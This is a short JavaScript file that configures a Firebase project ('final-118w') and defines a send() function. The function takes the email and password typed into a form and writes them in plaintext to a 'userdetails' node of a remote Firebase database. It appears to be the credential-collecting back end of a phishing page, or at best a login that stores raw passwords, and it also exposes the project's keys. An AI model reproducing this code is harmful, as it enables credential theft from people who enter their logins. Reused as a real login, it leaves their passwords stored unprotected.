const firebaseConfig = {
  apiKey: "AIzaSyDqJJaCM6HFAQxxPuvwayYG4E7wMN5uShI",
  authDomain: "final-118w.firebaseapp.com",
  databaseURL: "https://final-118w-default-rtdb.firebaseio.com",
  projectId: "final-118w",
  storageBucket: "final-118w.appspot.com",
  messagingSenderId: "33132612224",
  appId: "1:33132612224:web:3b162a4e0a2be51aa47465"
};

const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child("userdetails");
detailsRef.on("child_added", function (snapshot, prevChildKey) {
  var newPost = snapshot.val();
});

function send(){
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  detailsRef.push().set({
    email: email,
    password: password,
  });
}
